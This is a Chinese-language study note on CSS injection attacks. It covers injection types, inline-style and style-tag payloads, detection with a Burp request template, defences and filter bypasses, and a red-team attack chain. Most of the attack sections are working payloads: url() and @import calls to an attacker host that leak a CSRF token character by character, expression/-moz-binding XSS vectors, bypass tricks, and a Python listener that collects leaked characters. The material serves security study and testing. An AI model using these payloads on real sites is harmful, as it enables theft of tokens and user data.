## 目录

- [[#一、CSS注入概念|一、CSS注入概念]]
- [[#二、CSS注入类型与特征|二、CSS注入类型与特征]]
- [[#三、内联style注入技术|三、内联style注入技术]]
- [[#四、style标签注入|四、style标签注入]]
- [[#五、注入点检测方法|五、注入点检测方法]]
- [[#六、CSS注入 vs JS注入|六、CSS注入 vs JS注入]]
- [[#七、防御与绕过|七、防御与绕过]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、CSS注入概念

CSS注入是一种代码注入攻击，攻击者向Web页面注入恶意的CSS规则。虽然CSS本身不能直接执行脚本，但可以：

1. **泄露数据**：通过background-image等属性携带数据到攻击者服务器
2. **篡改页面**：覆盖原有样式，进行视觉钓鱼
3. **探测状态**：利用选择器匹配获取页面内部信息
4. **辅助XSS**：配合动画事件触发JS执行

### 发生条件

任意一个条件满足即可：
- 用户输入被直接输出到`<style>`标签内
- 用户输入被输出到元素的`style`属性中
- 用户控制的CSS文件被加载（如用户自定义主题）
- 未过滤的`@import`或`<link>`加载外部CSS

## 二、CSS注入类型与特征

### 类型1：完整CSS块注入

```
# 用户输入直接嵌入 <style> 标签
<style>
 body { background: red; }
 [INPUT_HERE]
</style>

# Payload
} /* 闭合前面的规则 */
body { display: none; } /* 隐藏整个页面 */
```

### 类型2：选择器注入

```
# CSS选择器由用户控制
<style>
 [INPUT_HERE] { color: red; }
</style>

# Payload（注入属性选择器，利用URL外泄）
#input[value^="a"] { background: url(https://attacker.com/a); }
#input[value^="b"] { background: url(https://attacker.com/b); }
```

### 类型3：属性值注入

```
# 属性值由用户控制
<style>
 body { background: [INPUT_HERE]; }
</style>

# Payload
red; } body { display: none } /*

# 或注入URL
url(https://attacker.com/exfil) /* closing comment */
```

### 类型4：内联style属性注入

```
<div style="color: [INPUT_HERE]">
# Payload
red; background: url(https://attacker.com/exfil)
```

## 三、内联style注入技术

### 基础逃逸

```
原代码：<div style="color: [INPUT]">
输入：blue; background-image: url(https://attacker.com/log)
结果：<div style="color: blue; background-image: url(https://attacker.com/log)">
```

### 属性值劫持

如果注入点在background-color：
```
原代码：<div style="background-color: [INPUT]">
输入：transparent; background-image: url(https://attacker.com/exfil) 
```

### 利用CSS特性

```css
/* 使用 expression() 仅IE支持 */
background: expression(alert(1));

/* 使用 -moz-binding 仅Firefox(XUL) */
background: -moz-binding(url('https://attacker.com/evil.xml#xss'));

/* 使用 @import 利用（在现代CSS中@import只能出现在规则块之前）*/
```

### HTML注入配合CSS

```html
<!-- 如果同时存在HTML注入和style属性注入 -->
<div title="me" style="[INPUT]">
<!-- Payload -->
x" onmouseover="alert(1)"
<!-- 结果：属性逃逸到HTML，注入事件 -->
```

当输入同时影响HTML属性和CSS属性时，优先尝试通过引号闭合逃逸到HTML层面。

## 四、style标签注入

### 完整块注入

```html
<style>
 .theme { color: blue; }
 [INPUT]
</style>

<!-- Payload -->
* { display: none } /* 全页面隐藏 */

<!-- 更隐蔽的钓鱼 -->
.login-form { display: none }
.fake-login { display: block }
```

### @import外泄

```html
<style>
 [INPUT]
</style>

<!-- Payload：
@import url('https://attacker.com/log_css'); 
-->

<!-- 如果输入出现在前面，后续规则可被利用 -->
```

### 逐字符外泄选择器链

这是CSS注入最具杀伤力的技术：

```html
<style>
 [INPUT]
</style>

<!-- Payload（逐字符泄露CSRF Token） -->
input[name="csrf_token"][value^="0"] { 
 background-image: url(https://attacker.com/char?0); 
}
input[name="csrf_token"][value^="1"] { 
 background-image: url(https://attacker.com/char?1); 
}
input[name="csrf_token"][value^="a"] { 
 background-image: url(https://attacker.com/char?a); 
}
/* ... 覆盖所有可能的字符 (0-9, a-f 共16条) ... */

/* 第二波：已知token以'a'开头 */
input[name="csrf_token"][value^="a0"] { background: url(https://exfil/a0); }
input[name="csrf_token"][value^="a1"] { background: url(https://exfil/a1); }
/* ... 逐字符推断完整token ... */
```

## 五、注入点检测方法

### 手动检测

**1. 视觉确认**
```
输入: } * { background-image: url(https://yourserver.com/test); } /*
观察: yourserver.com是否有请求？（确认CSS是否可注入URL）
```

**2. 属性验证**
```
输入: } * { border: 10px solid red !important } /*
观察: 页面是否出现红色边框？
```

### 自动检测

**CSS注入检测Burp请求模板：**

```http
POST /profile/theme HTTP/1.1
Host: target.com
Content-Type: application/json

{"theme": "} * { background-image: url(https://your-collaborator.oastify.com/poc); } /*"}
```

如果BP Collaborator收到HTTP请求，确认CSS注入可外泄数据。

### 测试场景Checklist

- [ ] 用户可自定义的主题/样式
- [ ] 富文本编辑器（HTML净化是否也净化style？）
- [ ] CSS @import 的来源是否可控
- [ ] `<link>` 的 href 是否可控
- [ ] Email中的CSS（邮件客户端可能支持CSS子集）
- [ ] PDF生成器（将HTML/CSS转为PDF）

## 六、CSS注入 vs JS注入

| 维度 | CSS注入 | JS注入（XSS） |
|------|---------|--------------|
| 危害 | 数据泄露、页面篡改 | 会话劫持、完全控制 |
| 检测难度 | 高（URL请求不明显） | 中 |
| 防御关注度 | 低（常被忽视） | 高 |
| 利用条件 | 需CSS注入点 | 需HTML/JS注入点 |
| 可窃取数据 | 属性值、当前URL | Cookie、任意DOM |
| 单次外泄带宽 | ~1字符/请求 | 一次性全部 |

CSS注入的价值在于：**即使XSS被CSP阻止，CSS注入仍可能成功**。

## 七、防御与绕过

### 防御方式

1. **CSS净化**：不允许`url()`、`@import`
2. **CSP**：`style-src 'self'` 阻止外部样式
3. **对用户CSS使用Shadow DOM**：CSS作用域隔离
4. **过滤style属性**：移除或编码`url(`括号

### 绕过技巧

| 防御 | 绕过 |
|------|------|
| 过滤`url(` | unicode编码：`\0075rl(` (现代浏览器已修复) |
| CSP `style-src 'self'` | 如果`'unsafe-inline'`存在，仍可内联注入 |
| 过滤`@import` | 尝试空格：`@\69mport` |
| 输入长度限制 | 使用短域名：`url(//a.co/)` |
| 移除style属性 | HTML注入`<style>`标签（如果HTML过滤不严格） |

## 八、红队视角总结

### CSS注入攻击链

```
1. 发现注入点（style属性或style标签）
2. 确认真实可注入（外泄测试 → Collaborator收到请求）
3. 确定目标数据（CSRF Token / 用户名 / 输入值）
4. 构造分段选择器（逐字符外泄）
5. 持续监听 → 拼出完整数据
6. 使用数据 → 深入攻击（CSRF / 权限提升）
```

### 实战脚本模板

```python
# CSS Injection Exfil 脚本
import http.server
import re

class CSSExfilServer(http.server.BaseHTTPRequestHandler):
 def do_GET(self):
 path = self.path
 match = re.search(r'/char\?(.+)', path)
 if match:
 char = match.group(1)
 print(f"[+] Leaked: {char}")
 self.send_response(200)
 self.end_headers()
 self.wfile.write(b"body { }")

server = http.server.HTTPServer(('0.0.0.0', 8080), CSSExfilServer)
print("[*] CSS Exfil Server on :8080")
server.serve_forever()
```

---
**返回** [[CSS基础总目录|CSS基础总目录]] | [[../前端基础总目录|前端基础总目录]]
